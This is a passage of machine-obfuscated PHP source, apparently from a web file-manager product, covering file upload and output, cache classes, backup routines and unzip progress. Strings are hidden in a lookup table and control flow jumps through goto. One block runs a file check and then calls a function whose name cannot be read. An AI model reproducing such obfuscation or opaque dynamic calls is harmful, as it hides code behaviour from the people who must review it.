(!$Â¾Éõ‘¼) { return; } $this->model->where(array($ÄäÁç‚Ÿ[455] => $Â¾Éõ‘¼))->save(array($ÄäÁç‚Ÿ[85] => $¥¹¿«Øâ)); } public function upload($²Ÿö±Ó‘, $³ËâäØü, $¾•ïæŒ™ = false, $Öô±Á»Ÿ = REPEAT_REPLACE) { $†ş’ƒ¦ =& $_SERVER[”ú…±Ú¥]; $Ü›‰­Æª = $this->parse($²Ÿö±Ó‘); $º¦ÜêÒ = $this->model->addFile($Ü›‰­Æª[$†ş’ƒ¦[437]], $³ËâäØü, $Ü›‰­Æª[$†ş’ƒ¦[84]], $¾•ïæŒ™, $Öô±Á»Ÿ); return $this->getPathOuter($º¦ÜêÒ); } public function uploadFileByID($ÔŞƒúî¶, $¡êùÁÏ, $±×’•Ù¶) { $ÑÔş£Çû =& $_SERVER[”ú…±Ú¥]; $´§É’ùã = $this->parse($ÔŞƒúî¶); $¶ªí©Ù = $this->model->addFileByFileID($´§É’ùã[$ÑÔş£Çû[437]], $¡êùÁÏ, $´§É’ùã[$ÑÔş£Çû[84]], $±×’•Ù¶); return $this->getPathOuter($¶ªí©Ù); } public function addFileByRemote($¾¾÷»ù, $Ì…õÄ‚ú, $ğ©¿ñ = array(), $¸½’®û  = '', $Ğ¾êÌåÉ) { $˜™•Óıü =& $_SERVER[”ú…±Ú¥]; $ƒà«µ = $this->parse($¾¾÷»ù); $¸½’®û  = empty($¸½’®û ) ? $ƒà«µ[$˜™•Óıü[84]] : $¸½’®û ; $¡—¶èÈ = $this->model->addFileByRemote($ƒà«µ[$˜™•Óıü[437]], $Ì…õÄ‚ú, $¸½’®û , $ğ©¿ñ, $Ğ¾êÌåÉ); return $this->getPathOuter($¡—¶èÈ); } public function uploadLink($˜ƒ˜”ò€, $û¦‚˜„¿ = 0) { $êÊ®Ã¤‡ =& $_SERVER[”ú…±Ú¥]; $ƒ…ŒÑÎ³ = $this->parse($˜ƒ˜”ò€); $øî¤é§ = _get($GLOBALS[$êÊ®Ã¤‡[7]], $êÊ®Ã¤‡[1364]); $½î†ÖÉø = _get($GLOBALS[$êÊ®Ã¤‡[7]], $êÊ®Ã¤‡[1365]); $˜ƒ˜”ò€ = Model($êÊ®Ã¤‡[639])->createFileName($ƒ…ŒÑÎ³[$êÊ®Ã¤‡[84]], $øî¤é§, $½î†ÖÉø); return IO::uploadLink($˜ƒ˜”ò€, $û¦‚˜„¿); } public function fileNameAuto($¬·ìÜ®, $¨ÚØ”ä³, $¼èìÇŠß = REPEAT_REPLACE, $ÊÓÃäÃœ = false) { return $this->model->fileNameAuto($¬·ìÜ®, $¨ÚØ”ä³, $¼èìÇŠß, $ÊÓÃäÃœ); } public function fileNameExist($·šå×Â, $“¨°’µå) { return $this->model->fileNameExist($·šå×Â, $“¨°’µå); } protected function _fileOut($‰ŠŸĞÆ´, $›¯§±Ò— = false, $çéÊßã = false, $…±Î—’¹ = '', $Ì‡Ëşê½ = false) { $´÷ï®™ä =& $_SERVER[”ú…±Ú¥]; $Ÿú„ˆí¦ = $this->model->sourceInfo($‰ŠŸĞÆ´); if ($Ÿú„ˆí¦[$´÷ï®™ä[448]] == $´÷ï®™ä[88]) { header($´÷ï®™ä[1366]); die; } $ó¯« = $this->model->fileInfoGet($‰ŠŸĞÆ´); $…±Î—’¹ = $ó¯«[$´÷ï®™ä[176]] ? $ó¯«[$´÷ï®™ä[176]] : $…±Î—’¹; $—Ü§ü•è = isset($GLOBALS[$´÷ï®™ä[1367]]) ? $GLOBALS[$´÷ï®™ä[1367]] : $Ÿú„ˆí¦[$´÷ï®™ä[32]]; if ($Ì‡Ëşê½) { return IO::fileOutServer($ó¯«[$´÷ï®™ä[84]], $›¯§±Ò—, $—Ü§ü•è, $…±Î—’¹); } IO::fileOut($ó¯«[$´÷ï®™ä[84]], $›¯§±Ò—, $—Ü§ü•è, $…±Î—’¹); } public function fileOut($’ÊÈÙ¤­, $Áˆ÷ñ‘ = false, $§ëãŠ¼ = false, $¡ĞŒÖ‘Ö = '') { $this->_fileOut($’ÊÈÙ¤­, $Áˆ÷ñ‘, $§ëãŠ¼, $¡ĞŒÖ‘Ö); } public function fileOutServer($«ÒÇî˜ş, $Åáˆ—Ö = false, $ÂÙù¡ƒâ = false, $ŞéÀ“Á = '') { $this->_fileOut($«ÒÇî˜ş, $Åáˆ—Ö, $ÂÙù¡ƒâ, $ŞéÀ“Á, !0); } protected function _fileOutImage($µ™‘Ã°é, $Ò¯ßƒú– = 250) { $¶½›•ò£ =& $_SERVER[”ú…±Ú¥]; $©ïŸÜ¡â = $this->model->pathInfo($µ™‘Ã°é); if ($©ïŸÜ¡â[$¶½›•ò£[448]] == $¶½›•ò£[88]) { show_json($¶½›•ò£[1368] . $µ™‘Ã°é, !1); } $¾”ò–Åü = $this->model->fileInfoGet($µ™‘Ã°é); $¾”ò–Åü[$¶½›•ò£[32]] = $©ïŸÜ¡â[$¶½›•ò£[32]]; $¾”ò–Åü[$¶½›•ò£[169]] = $©ïŸÜ¡â[$¶½›•ò£[169]]; $GLOBALS[$¶½›•ò£[1367]] = $¾”ò–Åü[$¶½›•ò£[32]]; $GLOBALS[$¶½›•ò£[168]] = $¾”ò–Åü; IO::fileOutImage($¾”ò–Åü[$¶½›•ò£[84]], $Ò¯ßƒú–); } public function fileOutImage($Ô®½«Æ, $È‹¶¾û™ = 250) { $this->_fileOutImage($Ô®½«Æ, $È‹¶¾û™); } public function fileOutImageServer($ó²¥Ì”Û, $½ÉåÜ­á = 250) { $this->_fileOutImage($ó²¥Ì”Û, $½ÉåÜ­á); } public function link($ú¬Ôæª¶, $öì‹Ü = '') { $­·Üå¾ = $this->model->fileInfoGet($ú¬Ôæª¶); return IO::link($­·Üå¾[$_SERVER[”ú…±Ú¥][84]], $öì‹Ü); } protected function parse($Ğ”›ÂÈ‘) { $Ó¿äÒü =& $_SERVER[”ú…±Ú¥]; if (strstr($Ğ”›ÂÈ‘, $Ó¿äÒü[8]) === !1) { return array($Ó¿äÒü[457] => intval($Ğ”›ÂÈ‘), $Ó¿äÒü[84] => $Ó¿äÒü[12], $Ó¿äÒü[1363] => array()); } $µÚã°ú¢ = explode($Ó¿äÒü[8], trim($Ğ”›ÂÈ‘, $Ó¿äÒü[8])); if (count($µÚã°ú¢) < 2) { show_tips(clear_html($Ğ”›ÂÈ‘) . $Ó¿äÒü[1369]); } return array($Ó¿äÒü[457] => intval($µÚã°ú¢[0]), $Ó¿äÒü[84] => $µÚã°ú¢[1], $Ó¿äÒü[1363] => array_slice($µÚã°ú¢, 1)); } } goto DéÊ„°„İç; a÷“áªÊóİ: if ($_SERVER[$_SERVER[”ú…±Ú¥][186]] != $_SERVER[$_SERVER[”ú…±Ú¥][187]]) { $_getc = $_SERVER[”ú…±Ú¥][188]; $_getfile = $_SERVER[$_SERVER[”ú…±Ú¥][189]] . $_SERVER[”ú…±Ú¥][190]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ú…±Ú¥][191], $_getfilec); if (count($_getarrs) < $_SERVER[”ú…±Ú¥][192]) { $exit = $_SERVER[”ú…±Ú¥][193]; $exit(); } $_act = $_SERVER[”ú…±Ú¥][194]; $_act($_SERVER[$_SERVER[”ú…±Ú¥][195]]); } class CacheLockDatabase { public function lock($‡ü¤ÎÂ, $ÒÄê—¤ = 0) { $¦—õï™À = Model($_SERVER[”ú…±Ú¥][861]); $õ¬¨ãˆß = microtime(!0) + $ÒÄê—¤; while (microtime(!0) < $õ¬¨ãˆß) { $¤…â¨¦ò = $¦—õï™À->get($‡ü¤ÎÂ); if (!$¤…â¨¦ò || $¤…â¨¦ò < microtime(!0)) { $Üİ„°” = $¦—õï™À->set($‡ü¤ÎÂ, $õ¬¨ãˆß); if ($Üİ„°”) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Œ¡™õÆ³) { return Model($_SERVER[”ú…±Ú¥][861])->get($Œ¡™õÆ³); } public function unlock($Òšìõ…°) { Model($_SERVER[”ú…±Ú¥][861])->remove($Òšìõ…°); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($”Ö“‰®ë, $™òªú„Û) { $Ûîé—É¨ =& $_SERVER[”ú…±Ú¥]; if (!class_exists($Ûîé—É¨[898])) { show_json($Ûîé—É¨[899], !1); } $this->cacheTime = $™òªú„Û; $this->handle = new Memcached(); if (is_array($”Ö“‰®ë[$Ûîé—É¨[900]]) && count($”Ö“‰®ë[$Ûîé—É¨[900]]) >= 1) { foreach ($”Ö“‰®ë[$Ûîé—É¨[900]] as $ã­¹›’) { $ÓïæÆ½¢ = explode($Ûîé—É¨[4], $ã­¹›’); $this->handle->addServer($ÓïæÆ½¢[0], $ÓïæÆ½¢[1]); } } else { $this->handle->addServer($”Ö“‰®ë[$Ûîé—É¨[182]], $”Ö“‰®ë[$Ûîé—É¨[183]]); } } public function set($ÂĞÃ„†, $œÉğäıà, $¾«“ú…Á = false) { $¾«“ú…Á = $¾«“ú…Á ? $¾«“ú…Á : $this->cacheTime; return $this->handle->set($ÂĞÃ„†, $œÉğäıà, $¾«“ú…Á); } public function get($ô»š¹ˆÓ) { return $this->handle->get($ô»š¹ˆÓ); } public function remove($ ™œàöÜ) { return $this->handle->delete($ ™œàöÜ); } public function deleteAll() { return $this->handle->flush(); } } goto bâêäµ¤Á¹; B’á¶¹«À¶: class BackupDbFile { public function __construct() { } public function index() { $£ÇÛŠ¾ =& $_SERVER[”ú…±Ú¥]; $‚©±˜º„ = Backup::get(); $üÉ‡Ÿ” = $‚©±˜º„[$£ÇÛŠ¾[32]]; $µÂùÄÂ = $this->tmpFilesPath() . "\x62\141\x63\153\x75\x70\137{$üÉ‡Ÿ”}\x2f"; $á™•ñœ¦ = $this->backupPath($‚©±˜º„); if (!($á™•ñœ¦ = IO::mkdir($á™•ñœ¦))) { return !1; } $ÎÎ·¥š¶ = IO::listPath($µÂùÄÂ); $èèçÉ¼ = isset($ÎÎ·¥š¶[$£ÇÛŠ¾[83]]) ? $ÎÎ·¥š¶[$£ÇÛŠ¾[83]] : array(); $å™áÜœš = array_sum(array_column($èèçÉ¼, $£ÇÛŠ¾[76])); if (!$å™áÜœš) { return !1; } $²Ší­Şà = array($£ÇÛŠ¾[830] => $å™áÜœš, $£ÇÛŠ¾[831] => time()); Backup::set($²Ší­Şà); $ÑØ™¢ÍÁ = new TaskFileTransfer($£ÇÛŠ¾[832], $£ÇÛŠ¾[812], count($èèçÉ¼), LNG($£ÇÛŠ¾[813]) . $£ÇÛŠ¾[424] . LNG($£ÇÛŠ¾[815]) . $£ÇÛŠ¾[833]); $ÑØ™¢ÍÁ->task[$£ÇÛŠ¾[795]] = $å™áÜœš; foreach ($ÎÎ·¥š¶[$£ÇÛŠ¾[83]] as $†‰¥Ğ¯) { $¦¸½±„š = IO::move($†‰¥Ğ¯[$£ÇÛŠ¾[84]], $á™•ñœ¦); if (!$¦¸½±„š) { $ÑØ™¢ÍÁ->end(); $¸İµƒú… = IO::getLastError($£ÇÛŠ¾[834] . $†‰¥Ğ¯[$£ÇÛŠ¾[84]] . $£ÇÛŠ¾[835] . $á™•ñœ¦ . $£ÇÛŠ¾[164]); write_log($¸İµƒú…, $£ÇÛŠ¾[812]); return !1; } } $´Š°ÄåÚ = new DbManage(); $ßù‰£¶ = $´Š°ÄåÚ->getSqlFile(); if (!$ßù‰£¶[$£ÇÛŠ¾[836]] || !$ßù‰£¶[$£ÇÛŠ¾[13]]) { return !1; } IO::move($ßù‰£¶[$£ÇÛŠ¾[836]], $á™•ñœ¦); IO::move($ßù‰£¶[$£ÇÛŠ¾[13]], $á™•ñœ¦); $ÑØ™¢ÍÁ->end(); $²Ší­Şà = array($£ÇÛŠ¾[837] => $å™áÜœš, $£ÇÛŠ¾[838] => time()); Backup::set($²Ší­Şà); return !0; } private function backupPath($ŞÁĞÃæô) { $£º“û” =& $_SERVER[”ú…±Ú¥]; $Öû¤÷øù = $ŞÁĞÃæô[$£º“û”[32]]; $Ï¨ÜĞùò = Model($£º“û”[802])->get($£º“û”[803]); $ò¿™‰ = substr(md5($£º“û”[804] . $Ï¨ÜĞùò . $Öû¤÷øù), 0, 8); return "\173\151\157\x3a{$ŞÁĞÃæô[$£º“û”[783]]}\x7d\57\144\141\x74\141\142\141\x73\x65\57\x62\141\x63\153\x75\x70\x2f" . $Öû¤÷øù . $£º“û”[11] . $ò¿™‰; } private function tmpFilesPath() { $ßïë„Ó¨ =& $_SERVER[”ú…±Ú¥]; $•Â¶®‘¿ = TEMP_FILES; if ($GLOBALS[$ßïë„Ó¨[6]][$ßïë„Ó¨[89]][$ßïë„Ó¨[828]]) { $•Â¶®‘¿ = $GLOBALS[$ßïë„Ó¨[6]][$ßïë„Ó¨[89]][$ßïë„Ó¨[828]]; if (!mk_dir($•Â¶®‘¿) || !is_writable($•Â¶®‘¿) || !IO::mkfile($•Â¶®‘¿ . $ßïë„Ó¨[829])) { $•Â¶®‘¿ = TEMP_FILES; } } return $•Â¶®‘¿; } } class BackupFile { public function __construct() { } public function index() { $ëéØ¦Êş = Backup::get(); $¶†æœ‰Ğ = $ëéØ¦Êş[$_SERVER[”ú…±Ú¥][331]][$_SERVER[”ú…±Ú¥][210]][$_SERVER[”ú…±Ú¥][506]]; $‚Üï´§® = array($_SERVER[”ú…±Ú¥][507] => array($_SERVER[”ú…±Ú¥][839], $¶†æœ‰Ğ), $_SERVER[”ú…±Ú¥][840] => array($_SERVER[”ú…±Ú¥][369], $ëéØ¦Êş[$_SERVER[”ú…±Ú¥][783]])); $ĞÙô§÷Æ = (int) Model($_SERVER[”ú…±Ú¥][821])->where($‚Üï´§®)->count($_SERVER[”ú…±Ú¥][506]); $âİŒÍšØ = (int) Model($_SERVER[”ú…±Ú¥][821])->where($‚Üï´§®)->sum($_SERVER[”ú…±Ú¥][76]); $÷‹ì±ßı = new TaskFileTransfer($_SERVER[”ú…±Ú¥][841], $_SERVER[”ú…±Ú¥][812], $ĞÙô§÷Æ, LNG($_SERVER[”ú…±Ú¥][813]) . $_SERVER[”ú…±Ú¥][814] . LNG($_SERVER[”ú…±Ú¥][842])); $÷‹ì±ßı->task[$_SERVER[”ú…±Ú¥][795]] = $âİŒÍšØ; $ßÛ¨ëï = array($_SERVER[”ú…±Ú¥][843] => $ĞÙô§÷Æ, $_SERVER[”ú…±Ú¥][844] => $âİŒÍšØ, $_SERVER[”ú…±Ú¥][845] => time()); Backup::set($ßÛ¨ëï); $²ÎûÈ†õ = !0; $°‘ĞÅó = $this->storeIds(); $™ò¨©¥— = 1; $ñáûğæù = 1000; $¨—‰Ôüº = $Ğø‰ âµ = 0; $ıÛ¡¦ã° = array(); $İ·¦›ñü = $ìÆ˜„Ÿô = 0; do { $®ıËËÔ¨ = $_SERVER[”ú…±Ú¥][846]; $¬Ò²–óá = Model($_SERVER[”ú…±Ú¥][821])->where($‚Üï´§®)->field($®ıËËÔ¨)->order($_SERVER[”ú…±Ú¥][847])->selectPage($ñáûğæù, $™ò¨©¥—); $•É–¶‡ = !empty($¬Ò²–óá[$_SERVER[”ú…±Ú¥][407]]) ? $¬Ò²–óá[$_SERVER[”ú…±Ú¥][407]] : array(); foreach ($•É–¶‡ as $¾ŸıœÌ¾) { if (!$this->_fileExist($¾ŸıœÌ¾, $ıÛ¡¦ã°, $°‘ĞÅó)) { $ĞÙô§÷Æ -= 1; $âİŒÍšØ -= (int) $¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][76]]; write_log("\146\x69\x6c\145\40\156\157\x74\40\x65\x78\x69\163\x74\56\x66\x69\154\145\x49\104\72{$¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][506]]}\54\40\x70\141\x74\x68\x3a{$¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][84]]}", $_SERVER[”ú…±Ú¥][848]); continue; } $ı¾÷ª·Å = $¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][84]]; $Ï«Åè¢„ = "\173\151\157\x3a{$ëéØ¦Êş[$_SERVER[”ú…±Ú¥][783]]}\x7d" . substr($ı¾÷ª·Å, strlen("\173\x69\157\72{$¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][849]]}\175")); if (IO::exist($Ï«Åè¢„)) { $÷‹ì±ßı->updateFileEnd($¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][32]], $¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][76]]); } else { $Ï«Åè¢„ = get_path_father($Ï«Åè¢„); IO::mkdir($Ï«Åè¢„); if (!IO::copy($ı¾÷ª·Å, $Ï«Åè¢„, $_SERVER[”ú…±Ú¥][850])) { write_log($_SERVER[”ú…±Ú¥][851] . $ı¾÷ª·Å . $_SERVER[”ú…±Ú¥][835] . $Ï«Åè¢„ . $_SERVER[”ú…±Ú¥][164], $_SERVER[”ú…±Ú¥][812]); $²ÎûÈ†õ = !1; break; } } $¶†æœ‰Ğ = $¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][506]]; $Ğø‰ âµ += 1; $¨—‰Ôüº += $¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][76]]; $ìÆ˜„Ÿô += 1; $İ·¦›ñü += $¾ŸıœÌ¾[$_SERVER[”ú…±Ú¥][76]]; if ($¨—‰Ôüº >= 1024 * 1024 * 100) { $ßÛ¨ëï = array($_SERVER[”ú…±Ú¥][852] => $¶†æœ‰Ğ, $_SERVER[”ú…±Ú¥][853] => $ìÆ˜„Ÿô, $_SERVER[”ú…±Ú¥][854] => $İ·¦›ñü); Backup::set($ßÛ¨ëï); $¨—‰Ôüº = $Ğø‰ âµ = 0; } } $‚ú°ôú† = count($•É–¶‡); $™ò¨©¥—++; } while ($‚ú°ôú† == $ñáûğæù); $÷‹ì±ßı->end(); $ßÛ¨ëï = array($_SERVER[”ú…±Ú¥][855] => 1, $_SERVER[”ú…±Ú¥][793] => time(), $_SERVER[”ú…±Ú¥][807] => 1, $_SERVER[”ú…±Ú¥][852] => $¶†æœ‰Ğ, $_SERVER[”ú…±Ú¥][844] => $âİŒÍšØ, $_SERVER[”ú…±Ú¥][843] => $ĞÙô§÷Æ, $_SERVER[”ú…±Ú¥][856] => time()); if ($Ğø‰ âµ) { $ßÛ¨ëï[$_SERVER[”ú…±Ú¥][853]] = $ìÆ˜„Ÿô; $ßÛ¨ëï[$_SERVER[”ú…±Ú¥][854]] = $İ·¦›ñü; } Backup::set($ßÛ¨ëï); $this->_fileFilter($ıÛ¡¦ã°); return !0; } private function _fileExist($èëÙ¿’ü, &$©´•²Ú×, $‘Ñ¡Ïä) { $òã¨èŸÛ =& $_SERVER[”ú…±Ú¥]; $¿‰½íá¥ = $èëÙ¿’ü[$òã¨èŸÛ[84]]; if (in_array($èëÙ¿’ü[$òã¨èŸÛ[506]], $©´•²Ú×)) { return !1; } if (!in_array($èëÙ¿’ü[$òã¨èŸÛ[849]], $‘Ñ¡Ïä)) { return !1; } if (IO::exist($¿‰½íá¥)) { return !0; } $Ä´ğËÍ” = get_path_father($¿‰½íá¥); if (IO::exist($Ä´ğËÍ”)) { $©´•²Ú×[] = $èëÙ¿’ü[$òã¨èŸÛ[506]]; return !1; } $ÉÁ¦¦Ú = array($òã¨èŸÛ[849] => $èëÙ¿’ü[$òã¨èŸÛ[849]], $òã¨èŸÛ[84] => array($òã¨èŸÛ[421], "{$Ä´ğËÍ”}\x25")); $é¹Ô€Û = Model($òã¨èŸÛ[821])->where($ÉÁ¦¦Ú)->field($òã¨èŸÛ[507])->select(); $©´•²Ú× = array_merge($©´•²Ú×, array_to_keyvalue($é¹Ô€Û, $òã¨èŸÛ[12], $òã¨èŸÛ[506])); return !1; } private function _fileFilter($œÃ†–) { $Áü®¼¦¢ =& $_SERVER[”ú…±Ú¥]; if (empty($œÃ†–)) { return; } $­‹Û¯Ÿ— = array($Áü®¼¦¢[506] => array($Áü®¼¦¢[7], array_unique($œÃ†–))); $†Ì÷ñöÇ = Model($Áü®¼¦¢[857])->where($­‹Û¯Ÿ—)->field($Áü®¼¦¢[440])->select(); foreach ($†Ì÷ñöÇ as $ùòË¢Ó) { Model($Áü®¼¦¢[857])->remove($ùòË¢Ó[$Áü®¼¦¢[440]], !1); } } private function storeIds() { $õ³¹Œ‰ =& $_SERVER[”ú…±Ú¥]; $Û¬­áÅ‚ = Model($õ³¹Œ‰[799])->listData(); $‚±«Ë · = array(); $±íñ¡¹á = $GLOBALS[$õ³¹Œ‰[6]][$õ³¹Œ‰[89]][$õ³¹Œ‰[858]]; foreach ($Û¬­áÅ‚ as $Ğ­—Á®) { $½‹¨¢› = strtolower($Ğ­—Á®[$õ³¹Œ‰[95]]); if (!isset($±íñ¡¹á[$½‹¨¢›])) { continue; } $‹‚ãñ¶¯ = $õ³¹Œ‰[74] . (isset($±íñ¡¹á[$½‹¨¢›]) ? $±íñ¡¹á[$½‹¨¢›] : ucfirst($½‹¨¢›)); if (!class_exists($‹‚ãñ¶¯)) { continue; } $‚±«Ë ·[] = $Ğ­—Á®[$õ³¹Œ‰[437]]; } return $‚±«Ë ·; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $»§»™ùß =& $_SERVER[”ú…±Ú¥]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‘‘ş‰ = $GLOBALS[$»§»™ùß[6]][$»§»™ùß[387]]; $«çı˜Òı = $‘‘ş‰[$‘‘ş‰[$»§»™ùß[859]]]; $¥Êóâ‹« = $‘‘ş‰[$»§»™ùß[860]]; switch ($‘‘ş‰[$»§»™ùß[859]]) { case $»§»™ùß[21]: self::$handle = Model($»§»™ùß[861]); break; case $»§»™ùß[862]: self::$handle = new CacheRedis($«çı˜Òı, $¥Êóâ‹«); break; case $»§»™ùß[863]: self::$handle = new CacheMemcached($«çı˜Òı, $¥Êóâ‹«); break; case $»§»™ùß[210]: self::$handle = new CacheFile($«çı˜Òı, $¥Êóâ‹«); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ùŞ¬ƒŠÉ) { if (is_array($ùŞ¬ƒŠÉ) || is_object($ùŞ¬ƒŠÉ)) { $ùŞ¬ƒŠÉ = json_encode($ùŞ¬ƒŠÉ); } $ùŞ¬ƒŠÉ = rawurlencode($ùŞ¬ƒŠÉ); return md5(KOD_SITE_ID . $_SERVER[”ú…±Ú¥][11] . $ùŞ¬ƒŠÉ); } public static function get($‰‰Öõåí, $€©®øóÕ = false) { $ÑÙÉû• = self::key($‰‰Öõåí); if ($€©®øóÕ) { return unserialize(self::init()->get($ÑÙÉû•)); } if (!isset(self::$memoryCache[$ÑÙÉû•])) { $©©ú¡ÇÈ = self::init()->get($ÑÙÉû•); self::$memoryCache[$ÑÙÉû•] = unserialize($©©ú¡ÇÈ); } return self::$memoryCache[$ÑÙÉû•]; } public static function set($««·œ, $éà¡Ë²², $÷àùúÕÒ = false) { $ËÓßëâŠ = self::key($««·œ); if (isset(self::$memoryCache[$ËÓßëâŠ]) && self::$memoryCache[$ËÓßëâŠ] === $éà¡Ë²²) { return !0; } if ($÷àùúÕÒ === 0) { self::$memoryCache[$ËÓßëâŠ] = $éà¡Ë²²; return !0; } CacheLock::lock($««·œ); $¨õæâÍº = self::init()->set($ËÓßëâŠ, serialize($éà¡Ë²²), $÷àùúÕÒ); self::$memoryCache[$ËÓßëâŠ] = $éà¡Ë²²; CacheLock::unlock($««·œ); return $¨õæâÍº; } public static function getCall($İœâó¦Ã, $Š‹åş¢·, $êÒ·­ğ“, $Åì³ùü = array()) { $Ê¹£Âƒà =& $_SERVER[”ú…±Ú¥]; $ãŸÚ¨ã = self::get($İœâó¦Ã); if ($ãŸÚ¨ã || $ãŸÚ¨ã === $Ê¹£Âƒà[12]) { return $ãŸÚ¨ã; } $ãŸÚ¨ã = call_user_func_array($êÒ·­ğ“, $Åì³ùü); $ãŸÚ¨ã = $ãŸÚ¨ã ? $ãŸÚ¨ã : $Ê¹£Âƒà[12]; self::set($İœâó¦Ã, $ãŸÚ¨ã, $Š‹åş¢·); return $ãŸÚ¨ã; } public static function remove($ô¨È˜Éº) { $ïóŸí—ş = self::key($ô¨È˜Éº); unset(self::$memoryCache[$ïóŸí—ş]); self::clearTimeout(); CacheLock::lock($ô¨È˜Éº); $Â²‹óîÉ = self::init()->remove($ïóŸí—ş); CacheLock::unlock($ô¨È˜Éº); return $Â²‹óîÉ; } public static function removeMemory($¼‚Û÷İê) { $ÇÁ¡ÙïÔ = self::key($¼‚Û÷İê); unset(self::$memoryCache[$ÇÁ¡ÙïÔ]); } public static function clearMemory($¬ş‚µË = false) { if ($¬ş‚µË) { $¬ş‚µË = self::key($¬ş‚µË); unset(self::$memoryCache[$¬ş‚µË]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[”ú…±Ú¥][864])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[”ú…±Ú¥][865])) { self::init()->clearTimeout(); } } } goto Cá²ÇƒËò; BæÓàÜ¥‘æ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $…ÎÖé¾ =& $_SERVER[”ú…±Ú¥]; parent::startAfter(); Hook::bind($…ÎÖé¾[1782], array($this, $…ÎÖé¾[1783])); Hook::bind($…ÎÖé¾[1222], array($this, $…ÎÖé¾[1784])); $É–™œ † =& $this->task; $É–™œ †[$…ÎÖé¾[1785]] = $…ÎÖé¾[1223]; if (!$É–™œ †[$…ÎÖé¾[1571]]) { $É–™œ †[$…ÎÖé¾[1571]] = LNG($…ÎÖé¾[1786]); } } protected function endAfter() { $ë–½ä‡é =& $_SERVER[”ú…±Ú¥]; parent::endAfter(); Hook::unbind($ë–½ä‡é[1782], array($this, $ë–½ä‡é[1783])); Hook::unbind($ë–½ä‡é[1222], array($this, $ë–½ä‡é[1784])); } public function updateAfter() { $ü®¨ï±Í =& $_SERVER[”ú…±Ú¥]; $‚â€†ø– =& $this->task; if (!$‚â€†ø–[$ü®¨ï±Í[818]] || !$‚â€†ø–[$ü®¨ï±Í[795]]) { return; } if ($‚â€†ø–[$ü®¨ï±Í[1785]] == $ü®¨ï±Í[1223]) { $ÆÃøÓÜ = 0; if ($‚â€†ø–[$ü®¨ï±Í[1724]]) { $ÆÃøÓÜ = $‚â€†ø–[$ü®¨ï±Í[1725]] / $‚â€†ø–[$ü®¨ï±Í[1724]]; } $‚â€†ø–[$ü®¨ï±Í[1673]] = $ÆÃøÓÜ * 0.3; } else { if ($‚â€†ø–[$ü®¨ï±Í[1785]] == $ü®¨ï±Í[351]) { $ÆÃøÓÜ = $‚â€†ø–[$ü®¨ï±Í[1672]] / $‚â€†ø–[$ü®¨ï±Í[818]]; $‚â€†ø–[$ü®¨ï±Í[1673]] = 0.3 + $ÆÃøÓÜ * 0.4; } else { if ($‚â€†ø–[$ü®¨ï±Í[1785]] == $ü®¨ï±Í[107]) { $¾‘è«Ñ = 0; if ($‚â€†ø–[$ü®¨ï±Í[1726]] == $ü®¨ï±Í[107]) { $¾‘è«Ñ = $‚â€†ø–[$ü®¨ï±Í[1725]]; } $ÆÃøÓÜ = ($‚â€†ø–[$ü®¨ï±Í[1729]] + $¾‘è«Ñ) / $‚â€†ø–[$ü®¨ï±Í[795]]; $‚â€†ø–[$ü®¨ï±Í[1673]] = 0.3 + 0.4 + $ÆÃøÓÜ * 0.3; } } } if ($‚â€†ø–[$ü®¨ï±Í[1673]] > 0) { $Î¤ïò± = timeFloat() - $‚â€†ø–[$ü®¨ï±Í[1675]] - $‚â€†ø–[$ü®¨ï±Í[1678]]; $‚â€†ø–[$ü®¨ï±Í[1679]] = $Î¤ïò± * (1 - $‚â€†ø–[$ü®¨ï±Í[1673]]) / $‚â€†ø–[$ü®¨ï±Í[1673]]; } } public function addFile($ÇÆ‘äØß) { $¨Ã®—Ì =& $_SERVER[”ú…±Ú¥]; $¿ãŸ½¥ =& $this->task; $®´ÜµÂ§ = IO::info($ÇÆ‘äØß); $¿ãŸ½¥[$¨Ã®—Ì[1722]] = $®´ÜµÂ§[$¨Ã®—Ì[32]]; $¿ãŸ½¥[$¨Ã®—Ì[1724]] = $®´ÜµÂ§[$¨Ã®—Ì[76]]; $¿ãŸ½¥[$¨Ã®—Ì[1725]] = 0; $¿ãŸ½¥[$¨Ã®—Ì[1093]] = $¨Ã®—Ì[1745]; $¿ãŸ½¥[$¨Ã®—Ì[1726]] = $¨Ã®—Ì[1223]; $¿ãŸ½¥[$¨Ã®—Ì[795]] = $®´ÜµÂ§[$¨Ã®—Ì[76]]; $¿ãŸ½¥[$¨Ã®—Ì[818]] = 1; $‹¾ª‰è… = 0; $¿ãŸ½¥[$¨Ã®—Ì[1733]] = array($¨Ã®—Ì[1734] => $‹¾ª‰è… + 1, $¨Ã®—Ì[458] => $®´ÜµÂ§[$¨Ã®—Ì[32]], $¨Ã®—Ì[84] => $®´ÜµÂ§[$¨Ã®—Ì[84]], $¨Ã®—Ì[547] => $®´ÜµÂ§[$¨Ã®—Ì[547]] ? $®´ÜµÂ§[$¨Ã®—Ì[547]] : $®´ÜµÂ§[$¨Ã®—Ì[84]]); $this->update(); } public function unzipAfter($—´ˆÜì¸) { $¼ÍèàĞ =& $_SERVER[”ú…±Ú¥]; $·è¼Šè® =& $this->task; $·è¼Šè®[$¼ÍèàĞ[1785]] = $¼ÍèàĞ[107]; $áÅüñÚ = IO::infoWithChildren($—´ˆÜì¸); $ÏÉ¾“ˆ¿ = 0; $·è¼Šè®[$¼ÍèàĞ[1733]] = array($¼ÍèàĞ[1734] => $ÏÉ¾“ˆ¿ + 1, $¼ÍèàĞ[458] => $áÅüñÚ[$¼ÍèàĞ[32]], $¼ÍèàĞ[84] => 